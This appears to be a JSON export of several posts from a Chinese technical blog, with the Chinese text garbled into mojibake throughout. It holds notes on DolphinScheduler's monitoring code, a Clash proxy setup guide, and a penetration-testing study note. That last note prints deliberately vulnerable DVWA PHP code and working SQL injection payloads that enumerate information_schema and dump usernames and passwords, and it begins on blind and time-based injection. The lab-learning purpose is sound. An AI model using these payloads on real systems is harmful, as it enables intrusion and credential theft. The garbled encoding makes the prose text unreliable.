æäº¤æºå¤´ä»»åŠ¡åˆ°ä»»åŠ¡ä¼˜å…ˆçº§é˜Ÿåˆ—ä¸­ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"http://blog.ioimp.top/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"dolphinscheduler","slug":"dolphinscheduler","permalink":"http://blog.ioimp.top/tags/dolphinscheduler/"},{"name":"å¤§æ•°æ®åˆ†æå¹³å°","slug":"å¤§æ•°æ®åˆ†æå¹³å°","permalink":"http://blog.ioimp.top/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E5%B9%B3%E5%8F%B0/"},{"name":"GitHub","slug":"GitHub","permalink":"http://blog.ioimp.top/tags/GitHub/"}]},{"title":"dolphinschedulerç›‘æ§åŠŸèƒ½åˆ¨æ","slug":"dolphinschedulerç›‘æ§åŠŸèƒ½åˆ¨æ","date":"2023-07-18T01:43:54.000Z","updated":"2023-08-04T01:46:07.073Z","comments":true,"path":"2023/07/18/dolphinschedulerç›‘æ§åŠŸèƒ½åˆ¨æ/","link":"","permalink":"http://blog.ioimp.top/2023/07/18/dolphinscheduler%E7%9B%91%E6%8E%A7%E5%8A%9F%E8%83%BD%E5%88%A8%E6%9E%90/","excerpt":"","text":"dolphinscheduleræºç åˆ†æè®°å½•Dolphinscheduler-api-1MonitorController.javaéƒ¨åˆ† ä»»åŠ¡ä¸€ï¼šæ–°å¢åŠŸèƒ½è·å–master&#x2F;workæœåŠ¡å™¨CPUæ ¸å¿ƒæ•°ç›®ä»¥åŠä¸€å…±ç£ç›˜å¤§å°ï¼Œ ä»»åŠ¡äºŒï¼šåˆ†æå¦‚ä½•å‘ç›‘æ§ä¸­å¿ƒAPIä¸­å†™å…¥master&#x2F;workæœåŠ¡å™¨CPUæ ¸å¿ƒæ•°ç›®ä»¥åŠä¸€å…±ç£ç›˜å¤§å°ï¼Œ æ ¸å¿ƒä»£ç éƒ¨åˆ†: 123456789101112131415/** * master list * * @param loginUser login user * @return master list */ @ApiOperation(value = &quot;listMaster&quot;, notes = &quot;MASTER_LIST_NOTES&quot;) @GetMapping(value = &quot;/masters&quot;) @ResponseStatus(HttpStatus.OK) @ApiException(LIST_MASTERS_ERROR) @AccessLogAnnotation(ignoreRequestArgs = &quot;loginUser&quot;) public Result listMaster(@ApiIgnore @RequestAttribute(value = Constants.SESSION_USER) User loginUser) &#123; Map&lt;String, Object&gt; result = monitorService.queryMaster(loginUser); return returnDataList(result); &#125; MonitorService.javaæ¥å£åŠŸèƒ½æ ¸å¿ƒéƒ¨åˆ† 1Map&lt;String, Object&gt; queryMaster(User loginUser); MonitorServiceImpl.javaæ¥å£å®ç°ç±»æ ¸å¿ƒéƒ¨åˆ† 123456789101112131415/** * query master list * * @param loginUser login user * @return master information list */ @Override public Map&lt;String, Object&gt; queryMaster(User loginUser) &#123; Map&lt;String, Object&gt; result = new HashMap&lt;&gt;(); List&lt;Server&gt; masterServers = getServerListFromRegistry(true); result.put(Constants.DATA_LIST, masterServers); putMsg(result, Status.SUCCESS); return result; &#125; result.put(Constants.*DATA_LIST*, masterServers); è¯­å¥ä¸­Constants.*DATA_LIST* æ˜¯å‰ç«¯jsoné‡Œçš„dataæ•°ç»„éƒ¨åˆ†ï¼Œè£…å…¥masterServers getServerListFromRegistry(true);æ–¹æ³• 123456@Override public List&lt;Server&gt; getServerListFromRegistry(boolean isMaster) &#123; return isMaster ? registryClient.getServerList(NodeType.MASTER) : registryClient.getServerList(NodeType.WORKER); &#125; registryClient.getServerList(NodeType.*MASTER*) è·å–masterèŠ‚ç‚¹çš„æœåŠ¡ä¿¡æ¯åˆ—è¡¨ 123456789101112131415161718192021222324252627282930313233343536373839404142public List&lt;Server&gt; getServerList(NodeType nodeType) &#123; Map&lt;String, String&gt; serverMaps = getServerMaps(nodeType, false); String parentPath = rootNodePath(nodeType); List&lt;Server&gt; serverList = new ArrayList&lt;&gt;(); for (Map.Entry&lt;String, String&gt; entry : serverMaps.entrySet()) &#123; String serverPath = entry.getKey(); String heartBeatJson = entry.getValue(); if (StringUtils.isEmpty(heartBeatJson)) &#123; logger.error(&quot;The heartBeatJson is empty, serverPath: &#123;&#125;&quot;, serverPath); continue; &#125; Server server = new Server(); switch (nodeType) &#123; case MASTER: MasterHeartBeat masterHeartBeat = JSONUtils.parseObject(heartBeatJson, MasterHeartBeat.class); server.setCreateTime(new Date(masterHeartBeat.getStartupTime())); server.setLastHeartbeatTime(new Date(masterHeartBeat.getReportTime())); server.setId(masterHeartBeat.getProcessId()); server.setCpuCoreCount(masterHeartBeat.getCpuCoreCount());//è·å–cpuæ ¸å¿ƒæ•° break; case WORKER: WorkerHeartBeat workerHeartBeat = JSONUtils.parseObject(heartBeatJson, WorkerHeartBeat.class); server.setCreateTime(new Date(workerHeartBeat.getStartupTime())); server.setLastHeartbeatTime(new Date(workerHeartBeat.getReportTime())); server.setId(workerHeartBeat.getProcessId()); break; &#125; server.setResInfo(heartBeatJson); // todo: add host, port in heartBeat Info, so that we don&#x27;t need to parse this again server.setZkDirectory(parentPath + &quot;/&quot; + serverPath); // set host and port String[] hostAndPort = serverPath.split(COLON); String[] hosts = hostAndPort[0].split(DIVISION_STRING); // fetch the last one server.setHost(hosts[hosts.length - 1]); server.setPort(Integer.parseInt(hostAndPort[1])); serverList.add(server); &#125; return serverList; &#125; [MasterHeartBeat.java](http://MasterHeartBeat.java) masterå¿ƒè·³ 12345678910111213141516171819202122232425262728293031323334353637383940414243/* * Licensed to the Apache Software Foundation (ASF) under one or more * contributor license agreements. See the NOTICE file distributed with * this work for additional information regarding copyright ownership. * The ASF licenses this file to You under the Apache License, Version 2.0 * (the &quot;License&quot;); you may not use this file except in compliance with * the License. You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an &quot;AS IS&quot; BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */package org.apache.dolphinscheduler.common.model;import lombok.AllArgsConstructor;import lombok.Builder;import lombok.Data;import lombok.NoArgsConstructor;@Data@Builder@NoArgsConstructor@AllArgsConstructorpublic class MasterHeartBeat implements HeartBeat &#123; private long startupTime; private long reportTime; private double cpuUsage; private double memoryUsage; private double loadAverage; private double availablePhysicalMemorySize; private double maxCpuloadAvg; private double reservedMemory; private double diskAvailable; private int processId; // æ–°å¢æ ¸æ•° private int cpuCoreCount;&#125; æˆ‘ä»¬è¿›ä¸€æ­¥æ·±å…¥è§£æ åˆ°è¿™é‡Œ getHeartBeat() æ–¹æ³•è¿™é‡Œå¼€å§‹è°ƒç”¨æœ€å…³é”®çš„ä¸€æ­¥.cpuCoreCount(OSUtils.getCPUCoreCount()) çœŸæ­£çš„è·å–masterèŠ‚ç‚¹æ ¸å¿ƒcupæ•°é‡","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"http://blog.ioimp.top/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"dolphinscheduler","slug":"dolphinscheduler","permalink":"http://blog.ioimp.top/tags/dolphinscheduler/"},{"name":"å¤§æ•°æ®åˆ†æå¹³å°","slug":"å¤§æ•°æ®åˆ†æå¹³å°","permalink":"http://blog.ioimp.top/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E5%B9%B3%E5%8F%B0/"},{"name":"GitHub","slug":"GitHub","permalink":"http://blog.ioimp.top/tags/GitHub/"}]},{"title":"Clash-for-linuxä½¿ç”¨æ•™ç¨‹","slug":"clash-for-linux","date":"2023-05-15T15:57:27.000Z","updated":"2023-08-15T16:06:28.465Z","comments":true,"path":"2023/05/15/clash-for-linux/","link":"","permalink":"http://blog.ioimp.top/2023/05/15/clash-for-linux/","excerpt":"","text":"ä½¿ç”¨æ•™ç¨‹ä¸‹è½½é¡¹ç›®ä¸‹è½½é¡¹ç›® 1$ git clone https://github.com/wanhebin/clash-for-linux.git è¿›å…¥åˆ°é¡¹ç›®ç›®å½•ï¼Œç¼–è¾‘.envæ–‡ä»¶ï¼Œä¿®æ”¹å˜é‡CLASH_URLçš„å€¼ã€‚ 12$ cd clash-for-linux$ vim .env æ³¨æ„ï¼š .env æ–‡ä»¶ä¸­çš„å˜é‡ CLASH_SECRET ä¸ºè‡ªå®šä¹‰ Clash Secretï¼Œå€¼ä¸ºç©ºæ—¶ï¼Œè„šæœ¬å°†è‡ªåŠ¨ç”Ÿæˆéšæœºå­—ç¬¦ä¸²ã€‚ å¯åŠ¨ç¨‹åºç›´æ¥è¿è¡Œè„šæœ¬æ–‡ä»¶start.sh è¿›å…¥é¡¹ç›®ç›®å½• 1$ cd clash-for-linux è¿è¡Œå¯åŠ¨è„šæœ¬ 1234567891011121314151617181920$ sudo bash start.shæ­£åœ¨æ£€æµ‹è®¢é˜…åœ°å€...Clashè®¢é˜…åœ°å€å¯è®¿é—®ï¼ [ OK ]æ­£åœ¨ä¸‹è½½Clashé…ç½®æ–‡ä»¶...é…ç½®æ–‡ä»¶config.yamlä¸‹è½½æˆåŠŸï¼ [ OK ]æ­£åœ¨å¯åŠ¨ClashæœåŠ¡...æœåŠ¡å¯åŠ¨æˆåŠŸï¼ [ OK ]Clash Dashboard è®¿é—®åœ°å€ï¼šhttp://&lt;ip&gt;:9090/uiSecretï¼šxxxxxxxxxxxxxè¯·æ‰§è¡Œä»¥ä¸‹å‘½ä»¤åŠ è½½ç¯å¢ƒå˜é‡: source /etc/profile.d/clash.shè¯·æ‰§è¡Œä»¥ä¸‹å‘½ä»¤å¼€å¯ç³»ç»Ÿä»£ç†: proxy_onè‹¥è¦ä¸´æ—¶å…³é—­ç³»ç»Ÿä»£ç†ï¼Œè¯·æ‰§è¡Œ: proxy_off 12$ source /etc/profile.d/clash.sh$ proxy_on æ£€æŸ¥æœåŠ¡ç«¯å£ 12345$ netstat -tln | grep -E &#x27;9090|789.&#x27;tcp 0 0 127.0.0.1:9090 0.0.0.0:* LISTEN tcp6 0 0 :::7890 :::* LISTEN tcp6 0 0 :::7891 :::* LISTEN tcp6 0 0 :::7892 :::* LISTEN æ£€æŸ¥ç¯å¢ƒå˜é‡ 123$ env | grep -E &#x27;http_proxy|https_proxy&#x27;http_proxy=http://127.0.0.1:7890https_proxy=http://127.0.0.1:7890 ä»¥ä¸Šæ­¥é„¹å¦‚æœæ­£å¸¸ï¼Œè¯´æ˜æœåŠ¡clashç¨‹åºå¯åŠ¨æˆåŠŸï¼Œç°åœ¨å°±å¯ä»¥ä½“éªŒé«˜é€Ÿä¸‹è½½githubèµ„æºäº†ã€‚ é‡å¯ç¨‹åºå¦‚æœéœ€è¦å¯¹Clashé…ç½®è¿›è¡Œä¿®æ”¹ï¼Œè¯·ä¿®æ”¹ conf/config.yaml æ–‡ä»¶ã€‚ç„¶åè¿è¡Œ restart.sh è„šæœ¬è¿›è¡Œé‡å¯ã€‚ æ³¨æ„ï¼šé‡å¯è„šæœ¬ restart.sh ä¸ä¼šæ›´æ–°è®¢é˜…ä¿¡æ¯ã€‚ åœæ­¢ç¨‹åº è¿›å…¥é¡¹ç›®ç›®å½• 1$ cd clash-for-linux å…³é—­æœåŠ¡ 1234$ sudo bash shutdown.shæœåŠ¡å…³é—­æˆåŠŸï¼Œè¯·æ‰§è¡Œä»¥ä¸‹å‘½ä»¤å…³é—­ç³»ç»Ÿä»£ç†ï¼šproxy_off 1$ proxy_off ç„¶åæ£€æŸ¥ç¨‹åºç«¯å£ã€è¿›ç¨‹ä»¥åŠç¯å¢ƒå˜é‡http_proxy|https_proxyï¼Œè‹¥éƒ½æ²¡åˆ™è¯´æ˜æœåŠ¡æ­£å¸¸å…³é—­ã€‚ Clash Dashboard è®¿é—® Clash Dashboard é€šè¿‡æµè§ˆå™¨è®¿é—® start.sh æ‰§è¡ŒæˆåŠŸåè¾“å‡ºçš„åœ°å€ï¼Œä¾‹å¦‚ï¼šhttp://192.168.0.1:9090/ui ç™»å½•ç®¡ç†ç•Œé¢ åœ¨API Base URLä¸€æ ä¸­è¾“å…¥ï¼šhttp:&#x2F;&#x2F;&lt;ip&gt;:9090 ï¼Œåœ¨Secret(optional)ä¸€æ ä¸­è¾“å…¥å¯åŠ¨æˆåŠŸåè¾“å‡ºçš„Secretã€‚ ç‚¹å‡»Addå¹¶é€‰æ‹©åˆšåˆšè¾“å…¥çš„ç®¡ç†ç•Œé¢åœ°å€ï¼Œä¹‹åä¾¿å¯åœ¨æµè§ˆå™¨ä¸Šè¿›è¡Œä¸€äº›é…ç½®ã€‚ æ›´å¤šæ•™ç¨‹ æ­¤ Clash Dashboard ä½¿ç”¨çš„æ˜¯yacdé¡¹ç›®ï¼Œè¯¦ç»†ä½¿ç”¨æ–¹æ³•è¯·ç§»æ­¥åˆ°yacdä¸ŠæŸ¥è¯¢ã€‚ å¸¸è§é—®é¢˜ éƒ¨åˆ†Linuxç³»ç»Ÿé»˜è®¤çš„ shell /bin/sh è¢«æ›´æ”¹ä¸º dashï¼Œè¿è¡Œè„šæœ¬ä¼šå‡ºç°æŠ¥é”™ï¼ˆæŠ¥é”™å†…å®¹ä¸€èˆ¬ä¼šæœ‰ -en [ OK ]ï¼‰ã€‚å»ºè®®ä½¿ç”¨ bash xxx.sh è¿è¡Œè„šæœ¬ã€‚ éƒ¨åˆ†ç”¨æˆ·åœ¨UIç•Œé¢æ‰¾ä¸åˆ°ä»£ç†èŠ‚ç‚¹ï¼ŒåŸºæœ¬ä¸Šæ˜¯å› ä¸ºå‚å•†æä¾›çš„clashé…ç½®æ–‡ä»¶æ˜¯ç»è¿‡base64ç¼–ç çš„ï¼Œä¸”é…ç½®æ–‡ä»¶æ ¼å¼ä¸ç¬¦åˆclashé…ç½®æ ‡å‡†ã€‚ ç›®å‰æ­¤é¡¹ç›®å·²é›†æˆè‡ªåŠ¨è¯†åˆ«å’Œè½¬æ¢clashé…ç½®æ–‡ä»¶çš„åŠŸèƒ½ã€‚å¦‚æœä¾ç„¶æ— æ³•ä½¿ç”¨ï¼Œåˆ™éœ€è¦é€šè¿‡è‡ªå»ºæˆ–è€…ç¬¬ä¸‰æ–¹å¹³å°ï¼ˆä¸æ¨èï¼Œæœ‰æ³„éœ²é£é™©ï¼‰å¯¹è®¢é˜…åœ°å€è½¬æ¢ã€‚ ç¨‹åºæ—¥å¿—ä¸­å‡ºç°error: unsupported rule type RULE-SETæŠ¥é”™ï¼Œè§£å†³æ–¹æ³•æŸ¥çœ‹å®˜æ–¹WIKI","categories":[{"name":"proxy","slug":"proxy","permalink":"http://blog.ioimp.top/categories/proxy/"}],"tags":[{"name":"clash","slug":"clash","permalink":"http://blog.ioimp.top/tags/clash/"}]},{"title":"æ¸—é€å­¦ä¹ è®°å½•OS","slug":"æ¸—é€å­¦ä¹ è®°å½•OS","date":"2022-12-25T14:58:29.000Z","updated":"2023-08-04T01:05:35.055Z","comments":true,"path":"2022/12/25/æ¸—é€å­¦ä¹ è®°å½•OS/","link":"","permalink":"http://blog.ioimp.top/2022/12/25/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95OS/","excerpt":"","text":"mysqlé»˜è®¤è¡¨ç›¸å…³çŸ¥è¯†åœ¨ mysql5 ç‰ˆæœ¬ä»¥åï¼Œmysql é»˜è®¤åœ¨æ•°æ®åº“ä¸­å­˜æ”¾åœ¨ä¸€ä¸ªå« infomation_schema é‡Œé¢ è¿™ä¸ªåº“é‡Œé¢æœ‰å¾ˆå¤šè¡¨ é‡ç‚¹æ˜¯è¿™ä¸‰ä¸ªè¡¨ columns ã€tablesã€SCHEMATA è¡¨å­—æ®µ CHEMA_NAME è®°å½•ç€åº“çš„ä¿¡æ¯ columns å­˜å‚¨è¯¥ç”¨æˆ·åˆ›å»ºçš„æ‰€æœ‰æ•°æ®åº“çš„åº“åã€æ ‡åå’Œå­—æ®µåã€‚ unionè”åˆæ³¨å…¥æ”»å‡»åŸç† æ­¥éª¤ä¸€ï¼šè”åˆä¸¤è¡¨ â€‹ 1.unionè¯­å¥è¦æ±‚å­—æ®µæ•°ä¸€æ ·æ‰å¯ä»¥æ‰§è¡Œï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å…ˆè¿›è¡Œå­—æ®µåˆ¤æ–­ å¸¸è§æ–¹æ³•ï¼š 1SELECT * FROM `users` WHERE user_id=1 order by 8 åˆ¤æ–­å‡ºå­—æ®µæ•°ä¸º8 ç„¶åé€šè¿‡ 1SELECT * FROM `users` WHERE user_id=1 union SELECT 1,2,3,4,5,6,7,8 è¿›è¡Œè”åˆæŸ¥è¯¢ è”åˆæŸ¥è¯¢åé¢çš„è¯­å¥ 1SELECT * FROM guestbook WHERE `comment_id`=1 union SELECT 1,2,user() selectåé¢çš„æ•°å­—å¯ä»¥æ›¿æ¢æˆå­—æ®µçš„åç§°æˆ–è€…å‡½æ•° 12-- æ›¿æ¢æˆmysqlå†…ç½®å‡½æ•°SELECT * FROM guestbook WHERE `comment_id`=1 union SELECT user(),md5(&#x27;a&#x27;),version() 123456-- æ›¿æ¢æˆmysqlæ•°æ®åº“é‡Œçš„å­—æ®µSELECT * FROM guestbook WHERE `comment_id`=1 union SELECT user_id,user,password from users-- ä¹Ÿå¯ä»¥åœ¨è¯­å¥åé¢åŠ ä¸Šlimité™å®šæ˜¾ç¤ºçš„è¡Œæ•°SELECT * FROM guestbook WHERE `comment_id`=1 union SELECT user_id,user,password from users limit 1SELECT * FROM guestbook WHERE `comment_id`=1 union SELECT user_id,user,password from users limit 0,2 12-- å¦‚æœä¸æƒ³è¦ç¬¬ä¸€ä¸ªè¡¨é‡Œçš„æ•°æ® å¯ä»¥æŠŠ1æ¢æˆ-1 å› ä¸ºé»˜è®¤è´Ÿæ•°å°±è¡¨ç¤ºä¸å­˜åœ¨çš„SELECT * FROM guestbook WHERE `comment_id`=-1 union SELECT user_id,user,password from users limit 1 unionè”åˆæ³¨å…¥æ”»å‡»åˆ†æåˆ†æè”åˆæ³¨å…¥æ¼æ´ä»£ç é¦–å…ˆæˆ‘ä»¬å…ˆåˆ†ææ„æˆè”åˆæ³¨å…¥æ”»å‡»çš„sqlæ³¨å…¥ä»£ç  123456789101112131415161718192021222324252627&lt;?phpif( isset( $_REQUEST[ &#x27;Submit&#x27; ] ) ) &#123; // Get input #è¿™é‡Œä¼ å…¥çš„å‚æ•°æ²¡æœ‰è¿›è¡Œè¿‡æ»¤ç›´æ¥è¿›å…¥sqlè¯­å¥ #ä»è¿™é‡Œå¯ä»¥åˆ¤æ–­å‡ºidæ˜¯å­—ç¬¦ä¸²ç±»å‹ æ‰€ä»¥åœ¨è¿›è¡Œsqlæ³¨å…¥æ£€æµ‹çš„æ—¶å€™è¦åŒ¹é…å­—ç¬¦ $id = $_REQUEST[ &#x27;id&#x27; ]; // Check database $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) &#123; // Get values //æ˜¾ç¤ºæŸ¥è¯¢æˆåŠŸåçš„å†…å®¹ $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // Feedback for end user echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; &#125; mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);&#125;?&gt; åˆ¤æ–­æ˜¯å¦å­˜åœ¨è”åˆæ³¨å…¥â€‹ æˆ‘ä»¬å…ˆé€šè¿‡é¶åœºæŸ¥è¯¢id å¦‚æœåœ¨æˆ‘ä»¬æ²¡è¿›è¡Œæºä»£ç åˆ†æçš„åŸºç¡€ä¸Š æˆ‘ä»¬é¦–å…ˆéœ€è¦è¿›è¡Œæ•°å­—å’Œå­—ç¬¦ä¸²åˆ¤æ–­ 1 å’Œ1â€˜ åˆ¤æ–­å‡ºä¼ å…¥æ•°æ®æ˜¯å­—ç¬¦ä¸²å‹ å³å­˜åœ¨æ³¨å…¥æ¼æ´ â€‹ è¾“å…¥ 1â€™and â€˜1â€™&#x3D;â€™1 é¡µé¢è¿”å›ç”¨æˆ·ä¿¡æ¯ 1â€™and â€˜1â€™&#x3D;â€™2 é¡µé¢è¿”å›ä¸ä¸€æ ·çš„ä¿¡æ¯ã€‚åŸºæœ¬å¯ä»¥ç¡®å®šå­˜åœ¨ SQL æ³¨å…¥æ¼æ´. åˆ¤æ–­å­—æ®µæ•°â€‹ ä½¿ç”¨è¯­å¥order byç¡®å®šå½“å‰è¡¨çš„å­—ç¬¦æ•° â€‹ order by 1 å¦‚æœé¡µé¢è¿”å›æ­£å¸¸ å­—æ®µæ•°ä¸å°‘äº 1,order by 2 ä¸å°‘äº 2ï¼Œä¸€ç›´å¦‚æ­¤ç±»æ¨ç›´åˆ°é¡µé¢å‡ºé”™ã€‚æ­£ç¡®çš„å­—æ®µæ•°æ˜¯å‡ºé”™æ•°å­—å‡å°‘ 1 å…¬å¼ order by n-1 1â€™ order by 1â€“+ æ­£å¸¸ 1â€™ order by 2â€“+ æ­£å¸¸ 1â€™ order by 3â€“+ å‡ºé”™ æ­£å¸¸é¡µé¢ è”åˆæŸ¥è¯¢æ³¨å…¥è·å–æ•æ„Ÿä¿¡æ¯â€‹ è·Ÿå‰é¢å’±ä»¬åˆ†æçš„ä¸€æ ·ï¼Œè¿™é‡Œåªæ˜¯æŠŠæŸ¥è¯¢çš„æ•°æ®æ›¿æ¢æˆäº†è”åˆæŸ¥è¯¢çš„è¯­å¥ ç„¶åè¿›è¡Œè·å–å¦ä¸€ä¸ªè¡¨çš„å­—æ®µæˆ–è€…å‡½æ•° 1-1&#x27; union select user,password from users-- æˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨group_concatï¼ˆï¼‰å‡½æ•°æ¥è¿›è¡Œåˆ†ç»„æ‰“å° 1-1&#x27; union select 1,group_concat(user(),0x3A,version())-- è”åˆæŸ¥è¯¢æ³¨å…¥é€šè¿‡information_schemaâ€‹ åœ¨é»‘ç›’æƒ…å†µä¸‹æˆ‘ä»¬æ˜¯ä¸çŸ¥é“å½“å‰æ•°æ®åº“é‡Œéƒ½æœ‰å“ªäº›è¡¨çš„æ‰€ä»¥æˆ‘ä»¬å…ˆä»mysqlçš„information_schemaå…¥æ‰‹è¿›è¡Œè¡¨çš„æŸ¥è¯¢ ç¬¬ä¸€ä¸ªè¡¨ï¼š è¿™é‡Œçš„databaseï¼ˆï¼‰å‡½æ•°æ˜¯æ¥é™å®šæŸ¥è¯¢çš„è¡¨æ˜¯å½“å‰è¡¨ 1-1&#x27; union select 1,(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 1)-- ç¬¬äºŒä¸ªè¡¨ï¼š 1-1&#x27; union select 1,(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 1,2)-- é€šè¿‡ä¸¤ä¸ªè¡¨çš„æŸ¥è¯¢æˆ‘ä»¬çŸ¥é“dvwaä¸­å«æœ‰çš„è¡¨ä¸ºguestbook å’Œusers è”åˆæŸ¥è¯¢æ³¨å…¥é€šè¿‡information_schemaè·å–å­—æ®µæˆ‘ä»¬çŸ¥é“æ•°æ®åº“çš„å­—æ®µéƒ½å­˜åœ¨mysqlé»˜è®¤å†…ç½®åº“information_schemaçš„columnsé‡Œï¼Œæ‰€ä»¥æˆ‘ä»¬æƒ³è¦è·å–å½“å‰æ•°æ®åº“çš„å­—æ®µåå­—æˆ‘ä»¬å¯ä»¥é€šè¿‡ è·å–usersè¡¨é‡Œçš„ç¬¬ä¸€ä¸ªå­—æ®µåå­— id 123-1&#x27; union select 1,(select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;users&#x27; limit 1)-- -- æ³¨æ„è¿™é‡Œä¸€å®šè¦åŠ ä¸Šé™å®š å› ä¸ºä½ æ¯æ¬¡æŸ¥è¯¢éƒ½æ˜¯ä¸€ä¸ªå­—æ®µå¦‚æœä¸åŠ ä¼šæŠ¥é”™-- Subquery returns more than 1 row è·å–ç¬¬äºŒä¸ªå­—æ®µåå­— password 1-1&#x27; union select 1,(select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;users&#x27; limit 2,1)-- è·å–ç¬¬ä¸‰ä¸ªå­—æ®µåå­— email 1-1&#x27; union select 1,(select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;users&#x27; limit 3,1)-- è·å–ç¬¬å››ä¸ªå­—æ®µåå­— secret 1-1&#x27; union select 1,(select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;users&#x27; limit 4,1)-- â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. é€šè¿‡è”åˆæŸ¥è¯¢è¡¨é‡Œé¢çš„å†…å®¹â€‹ é€šè¿‡ä»¥ä¸Šæ“ä½œæˆ‘ä»¬å·²ç»è·å–äº†å½“å‰æ•°æ®åº“çš„åº“åã€è¡¨åã€å­—æ®µ é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ä¸‹é¢è¯­å¥è·å–è¡¨é‡Œé¢çš„å†…å®¹äº† 1-1&#x27; union select 1,(select group_concat(user,0x3a,password) from users limit 1)-- booleanå¸ƒå°”å‹ç›²æ³¨å…¥ä»£ç åˆ†æ1234567891011121314151617181920212223242526272829&lt;?phpif( isset( $_GET[ &#x27;Submit&#x27; ] ) ) &#123; // Get input #idä¸ºå­—ç¬¦ä¸²å‹ getæ¥æ”¶idå‚æ•° $id = $_GET[ &#x27;id&#x27; ]; // Check database $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $getid ); // Removed &#x27;or die&#x27; to suppress mysql errors // Get results $num = @mysqli_num_rows( $result ); // The &#x27;@&#x27; character suppresses errors if( $num &gt; 0 ) &#123; // Feedback for end user echo &#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;; &#125; else &#123; // User wasn&#x27;t found, so the page wasn&#x27;t! header( $_SERVER[ &#x27;SERVER_PROTOCOL&#x27; ] . &#x27; 404 Not Found&#x27; ); // Feedback for end user echo &#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;?&gt; æ¥æ”¶ id çš„å€¼ï¼Œç›´æ¥å¸¦å…¥æŸ¥è¯¢ï¼Œå¦‚æœå­˜åœ¨å³è¿”å› users is exists in the database å¦åˆ™æ˜¾ç¤º users id is missing åƒè¿™ç§åªæœ‰æ­£ç¡®ä¸é”™è¯¯é¡µé¢ã€‚é¡µé¢ä¸ä¼šæ˜¾ç¤ºæ•°æ®åº“ é‡Œä»»ä½•å†…å®¹ï¼Œå¦‚æœå­˜åœ¨æ³¨å…¥ï¼Œæˆä¸ºç›²æ³¨å…¥ã€‚ â€‹ ç›²æ³¨å…¥çš„æ–¹æ³•æœ‰ä¸¤ç§ï¼šä¸€æ˜¯å¸ƒå°”å‹ç›²æ³¨å…¥ï¼ŒäºŒæ˜¯å»¶æ—¶æ³¨å…¥ åˆ¤æ–­ç›²æ³¨å…¥â€‹ æˆ‘ä»¬å¯ä»¥é€šè¿‡1&#39; and &#39;1&#39;=&#39;1 å’Œ 1&#39; and &#39;1&#39;=&#39;2 æ˜¯å¦ä¸€æ · â€‹ ä»¥åŠ 1&#39; and sleep(10)--è®©ä»–ç¡10såˆ¤æ–­æ˜¯å¦ä¸€æ · Booleanå¸ƒå°”å‹æ³¨å…¥æ”»å‡»â€‹ å› ä¸ºé¡µé¢ä¸ä¼šè¿”å›æŸ¥è¯¢çš„å†…å®¹æ‰€ä»¥æˆ‘ä»¬ä¸èƒ½ä½¿ç”¨è”åˆæŸ¥è¯¢æ³¨å…¥æ”»å‡»ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡æ„é€ sqlæ¥è·å–æ•°æ®ã€‚ â€‹ 11&#x27; and if(1=1,1,0)-- -- ä¸‰ç›®è¿ç®— å¸ƒå°”å‹ç›²æ³¨å…¥è·å–æ•°æ®åº“æ•æ„Ÿä¿¡æ¯â€‹ åœ¨é»‘ç›’æµ‹è¯•ç¯å¢ƒä¸‹ï¼Œé€šè¿‡æ„é€ sqlè¯­å¥æ¥è¿›è¡Œè·å–æ•æ„Ÿä¿¡æ¯ã€‚ æ„é€ sqlè¯­å¥å¸¸ç”¨çš„å‡½æ•°ï¼š 1.SUBSTRING()å­—ç¬¦ä¸²æˆªå–å‡½æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å­—ç¬¦ä¸²ï¼Œç¬¬äºŒä¸ªå‚æ•°å¼€å§‹æˆªå–ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯æˆªå–çš„é•¿åº¦ æˆ‘ä»¬å¯ä»¥æ„é€ è¿™æ ·çš„sqlè¯­å¥ 1SELECT if(SUBSTRING(database(),1,1)=&#x27;d&#x27;,1,0) 